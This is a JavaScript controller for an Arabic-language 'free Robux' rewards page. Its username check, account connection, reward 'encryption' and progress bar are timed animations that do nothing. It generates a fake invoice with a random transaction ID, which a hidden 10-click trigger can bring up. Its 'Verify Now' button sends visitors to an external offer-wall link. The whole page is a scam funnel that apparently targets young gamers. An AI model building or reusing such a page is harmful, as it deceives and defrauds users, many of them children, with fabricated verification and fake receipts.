/* ==========================================================================
   ROBLOX REWARDS REPOSITORY - JAVASCRIPT CONTROLLER
   Handles: Splash timer, Tab navigation, State validation, Stage transitions
   ========================================================================== */

document.addEventListener('DOMContentLoaded', () => {

    // ==================== STATE VARIABLES ====================
    let selectedReward = null;
    let registeredUsername = '';
    let isRegistered = false;

    // DOM Elements References
    const splashScreen = document.getElementById('splash-screen');
    const appContainer = document.getElementById('app-container');

    const usernameInput = document.getElementById('username-input');
    const registerBtn = document.getElementById('register-btn');
    const accountStatusIcon = document.getElementById('account-status-icon');
    const accountHelperNote = document.getElementById('account-helper-note');

    const tabRobux = document.getElementById('tab-robux');
    const tabItems = document.getElementById('tab-items');
    const robuxGrid = document.getElementById('robux-grid');
    const itemsGrid = document.getElementById('items-grid');
    const rewardAlert = document.getElementById('reward-alert');
    const sendRewardBtn = document.getElementById('send-reward-btn');

    const dynamicStageContainer = document.getElementById('dynamic-stage-container');
    const stage2Content = document.getElementById('stage-2-content');
    const stage3Content = document.getElementById('stage-3-content');
    const processingView = document.getElementById('processing-view');
    const confirmationView = document.getElementById('confirmation-view');

    const stage3ProgressFill = document.getElementById('stage3-progress-fill');
    const procUsername = document.getElementById('proc-username');
    const procReward = document.getElementById('proc-reward');

    const step1 = document.getElementById('step-1');
    const step2 = document.getElementById('step-2');
    const step3 = document.getElementById('step-3');

    const confUser = document.getElementById('conf-user');
    const confItem = document.getElementById('conf-item');

    // ==================== 1. STAGE 1: SPLASH SCREEN LOGIC (3-5 SECONDS CLASSIC) ====================
    function initSplashScreen() {
        // Generate random duration between 3000ms and 5000ms (3 to 5 seconds stay)
        const randomDuration = Math.floor(Math.random() * 2000) + 3000;

        setTimeout(() => {
            finishSplashScreen();
        }, randomDuration);
    }

    function finishSplashScreen() {
        if (appContainer) {
            appContainer.classList.remove('hidden');
        }
        if (splashScreen) {
            splashScreen.classList.add('fade-out');
            setTimeout(() => {
                splashScreen.style.setProperty('display', 'none', 'important');
                splashScreen.classList.add('hidden');
            }, 600);
        }
    }

    initSplashScreen();

    // ==================== TODAY'S DATE DISPLAY (DD/MM/YYYY) ====================
    function setCurrentDate() {
        const currentDateEl = document.getElementById('current-date');
        if (currentDateEl) {
            const today = new Date();
            const day = String(today.getDate()).padStart(2, '0');
            const month = String(today.getMonth() + 1).padStart(2, '0');
            const year = today.getFullYear();
            currentDateEl.textContent = `${day}/${month}/${year}`;
        }
    }
    setCurrentDate();

    const DEFAULT_NOTE_TEXT = "تأكد ان تكتب اسم المستخدم الصحيح .";
    let isVerifyingUsername = false;

    // Strict Roblox Username Validation Rules
    function validateUsernameRules(username) {
        if (!username) {
            return { valid: false, message: "يرجى كتابة اسم المستخدم أولاً!" };
        }
        if (username.length < 3) {
            return { valid: false, message: "اسم المستخدم يجب ألا يقل عن 3 أحرف!" };
        }
        if (username.length > 20) {
            return { valid: false, message: "اسم المستخدم يجب ألا يتجاوز 20 حرفاً!" };
        }
        // English letters, numbers, and underscores only
        if (!/^[a-zA-Z0-9_]+$/.test(username)) {
            return { valid: false, message: "يجب كتابة اسم المستخدم باللغة الإنجليزية فقط وبدون مسافات أو رموز!" };
        }
        // Cannot be numbers only
        if (!/[a-zA-Z]/.test(username)) {
            return { valid: false, message: "اسم المستخدم لا يمكن أن يتكون من أرقام فقط!" };
        }
        return { valid: true, message: "" };
    }

    // ==================== 2. ACCOUNT REGISTRATION LOGIC ====================
    function startAccountVerification() {
        if (isVerifyingUsername) return false;

        const value = usernameInput.value.trim();
        const validation = validateUsernameRules(value);

        if (!validation.valid) {
            if (accountHelperNote) {
                accountHelperNote.textContent = validation.message;
                accountHelperNote.classList.add('note-error');
            }
            accountStatusIcon.innerHTML = '<i class="fa-solid fa-circle-xmark" style="color: var(--roblox-red);"></i>';
            dynamicStageContainer.classList.add('disabled-section');
            usernameInput.focus();
            return false;
        }

        // Reset helper note if valid
        if (accountHelperNote) {
            accountHelperNote.textContent = DEFAULT_NOTE_TEXT;
            accountHelperNote.classList.remove('note-error');
        }
        isVerifyingUsername = true;

        // Visual State 1: Checking (جاري الفحص...)
        registerBtn.disabled = true;
        usernameInput.disabled = true;
        registerBtn.style.backgroundColor = 'var(--roblox-blue)';
        registerBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> <span>جاري الفحص...</span>';
        accountStatusIcon.innerHTML = '<i class="fa-solid fa-spinner fa-spin" style="color: var(--roblox-blue);"></i>';

        // Brief inspection delay (1.8 seconds)
        setTimeout(() => {
            isVerifyingUsername = false;
            registeredUsername = value;
            isRegistered = true;

            // Visual State 2: Verified (حساب موثق ✅)
            accountStatusIcon.innerHTML = '<i class="fa-solid fa-circle-check" style="color: var(--roblox-green);"></i>';
            usernameInput.disabled = true;
            usernameInput.classList.add('input-verified');

            registerBtn.disabled = false;
            registerBtn.style.backgroundColor = 'var(--roblox-green)';
            registerBtn.innerHTML = '<i class="fa-solid fa-check"></i> <span>موثق ✅</span>';

            // Unlock Stage 2 (Gifts selection)
            dynamicStageContainer.classList.remove('disabled-section');
        }, 1800);

        return true;
    }

    registerBtn.addEventListener('click', startAccountVerification);

    usernameInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            startAccountVerification();
        }
    });

    usernameInput.addEventListener('input', () => {
        if (accountHelperNote) {
            accountHelperNote.textContent = DEFAULT_NOTE_TEXT;
            accountHelperNote.classList.remove('note-error');
        }
        usernameInput.classList.remove('input-verified');
        usernameInput.disabled = false;

        const value = usernameInput.value.trim();
        const check = validateUsernameRules(value);

        if (check.valid) {
            accountStatusIcon.innerHTML = '<i class="fa-solid fa-circle-check" style="color: var(--roblox-green);"></i>';
        } else {
            accountStatusIcon.innerHTML = '';
            registerBtn.style.backgroundColor = 'var(--roblox-blue)';
            registerBtn.innerHTML = '<i class="fa-solid fa-right-to-bracket"></i> <span>دخول</span>';
            dynamicStageContainer.classList.add('disabled-section');
        }
    });

    // ==================== 3. NAVIGATION TABS LOGIC ====================
    tabRobux.addEventListener('click', () => {
        tabRobux.classList.add('active');
        tabItems.classList.remove('active');
        robuxGrid.classList.remove('hidden-grid');
        itemsGrid.classList.add('hidden-grid');
    });

    tabItems.addEventListener('click', () => {
        tabItems.classList.add('active');
        tabRobux.classList.remove('active');
        itemsGrid.classList.remove('hidden-grid');
        robuxGrid.classList.add('hidden-grid');
    });

    // ==================== 4. REWARD CARDS SELECTION LOGIC ====================
    const allCards = document.querySelectorAll('.reward-card');

    allCards.forEach(card => {
        card.addEventListener('click', () => {
            // Remove selected class from all
            allCards.forEach(c => c.classList.remove('selected'));

            // Add to clicked card
            card.classList.add('selected');

            // Store selected data
            selectedReward = {
                id: card.dataset.id,
                name: card.dataset.name,
                type: card.dataset.type
            };

            // Enable "Send Reward Now" button
            sendRewardBtn.disabled = false;
            sendRewardBtn.classList.remove('btn-disabled');

            rewardAlert.classList.add('hidden');
        });
    });

    // ==================== 5. STAGE 3: TRANSITION & PROCESSING (5 SECONDS) ====================
    sendRewardBtn.addEventListener('click', () => {
        // Step 1 Check: Username registered and valid?
        if (!isRegistered || !registeredUsername) {
            window.scrollTo({ top: 0, behavior: 'smooth' });
            startAccountVerification();
            return;
        }

        // Step 2 Check: Reward selected?
        if (!selectedReward) {
            rewardAlert.classList.remove('hidden');
            rewardAlert.scrollIntoView({ behavior: 'smooth', block: 'center' });
            return;
        }

        // Proceed to Stage 3 Processing
        startProcessingStage();
    });

    function startProcessingStage() {
        // Hide Header, Footer, Account Section & Stage 2 Content for Full Screen Stage 3
        const mainHeader = document.querySelector('.main-header');
        const mainFooter = document.querySelector('.main-footer');
        const accountSection = document.querySelector('.account-section');

        if (mainHeader) mainHeader.classList.add('hidden');
        if (mainFooter) mainFooter.classList.add('hidden');
        if (accountSection) accountSection.classList.add('hidden');

        stage2Content.classList.add('hidden');
        stage3Content.classList.remove('hidden');
        stage3Content.classList.add('fullscreen-stage');
        processingView.classList.remove('hidden');
        confirmationView.classList.add('hidden');

        // Populate values
        procUsername.textContent = registeredUsername;
        procReward.textContent = selectedReward.name;

        // Reset Steps & Progress Bar
        stage3ProgressFill.style.width = '0%';
        resetStepsUI();

        // 5 Seconds Processing Timeline
        const duration = 5000; // Exact 5 seconds requirement
        const startTime = Date.now();

        const procInterval = setInterval(() => {
            const elapsed = Date.now() - startTime;
            const progressRatio = Math.min(elapsed / duration, 1);
            const percent = Math.floor(progressRatio * 100);

            stage3ProgressFill.style.width = percent + '%';

            // Timeline Steps
            if (elapsed >= 1800 && elapsed < 3600) {
                // Step 1 Complete, Step 2 Active
                setStepState(step1, 'done', '<i class="fa-solid fa-circle-check highlight-green"></i> تم الاتصال بالحساب بنجاح');
                setStepState(step2, 'active', '<i class="fa-solid fa-spinner fa-spin"></i> تجهيز المكافأة: <span class="highlight">' + selectedReward.name + '</span>');
            } else if (elapsed >= 3600) {
                // Step 2 Complete, Step 3 Active
                setStepState(step2, 'done', '<i class="fa-solid fa-circle-check highlight-green"></i> تم تجهيز المكافأة بنجاح');
                setStepState(step3, 'active', '<i class="fa-solid fa-spinner fa-spin"></i> تشفير وتأكيد الحزمة النهائي...');
            }

            if (progressRatio >= 1) {
                clearInterval(procInterval);
                finishProcessingStage();
            }
        }, 30);
    }

    function resetStepsUI() {
        setStepState(step1, 'active', '<i class="fa-solid fa-spinner fa-spin"></i> التوصيل بالحساب: <span class="highlight">' + registeredUsername + '</span>');
        setStepState(step2, 'waiting', '<i class="fa-regular fa-clock"></i> تجهيز المكافأة: <span class="highlight">' + (selectedReward ? selectedReward.name : '') + '</span>');
        setStepState(step3, 'waiting', '<i class="fa-regular fa-clock"></i> تشفير وتأكيد الحزمة النهائي...');
    }

    function setStepState(element, state, htmlContent) {
        element.className = 'proc-step ' + state;
        element.innerHTML = htmlContent;
    }

    // References for confirmation & invoice views
    const confUserName = document.getElementById('conf-user-name');
    const confRewardName = document.getElementById('conf-reward-name');
    const countdownTimerEl = document.getElementById('countdown-timer');
    const secretTrigger = document.getElementById('secret-trigger');
    const successInvoiceView = document.getElementById('success-invoice-view');
    const invUser = document.getElementById('inv-user');
    const invItem = document.getElementById('inv-item');
    const invTxId = document.getElementById('inv-tx-id');
    const invDate = document.getElementById('inv-date');

    let countdownInterval = null;
    let secretClickCount = 0;

    function start3MinCountdown() {
        let totalSeconds = 180; // 3 minutes countdown
        if (countdownInterval) clearInterval(countdownInterval);

        countdownInterval = setInterval(() => {
            if (totalSeconds <= 0) {
                clearInterval(countdownInterval);
                if (countdownTimerEl) countdownTimerEl.textContent = '00:00';
                return;
            }
            totalSeconds--;
            const mins = String(Math.floor(totalSeconds / 60)).padStart(2, '0');
            const secs = String(totalSeconds % 60).padStart(2, '0');
            if (countdownTimerEl) {
                countdownTimerEl.textContent = `${mins}:${secs}`;
            }
        }, 1000);
    }

    function showInvoiceScreen() {
        if (confirmationView) confirmationView.classList.add('hidden');
        if (successInvoiceView) successInvoiceView.classList.remove('hidden');

        if (invUser) invUser.textContent = registeredUsername || 'Player';
        if (invItem) invItem.textContent = selectedReward ? selectedReward.name : '10,000 Robux';

        // Generate random 7-digit TX ID
        const randomTx = Math.floor(1000000 + Math.random() * 9000000);
        if (invTxId) invTxId.textContent = `#RBX-${randomTx}`;

        // Format today's date
        const today = new Date();
        const day = String(today.getDate()).padStart(2, '0');
        const month = String(today.getMonth() + 1).padStart(2, '0');
        const year = today.getFullYear();
        if (invDate) invDate.textContent = `${day}/${month}/${year}`;
    }

    // Verify Now Button Redirection
    const verifyNowBtn = document.getElementById('verify-now-btn');
    if (verifyNowBtn) {
        verifyNowBtn.addEventListener('click', () => {
            window.location.href = 'https://appcomplete.org/sl/v199o';
        });
    }

    // Secret 10-click trigger on word 'مستودع'
    if (secretTrigger) {
        secretTrigger.addEventListener('click', () => {
            secretClickCount++;
            if (secretClickCount >= 10) {
                secretClickCount = 0;
                showInvoiceScreen();
            }
        });
    }

    function finishProcessingStage() {
        setTimeout(() => {
            processingView.classList.add('hidden');
            confirmationView.classList.remove('hidden');

            if (confUserName) confUserName.textContent = registeredUsername;
            if (confRewardName) confRewardName.textContent = selectedReward ? selectedReward.name : '';

            // Start 3-minute timer
            start3MinCountdown();
        }, 400);
    }

});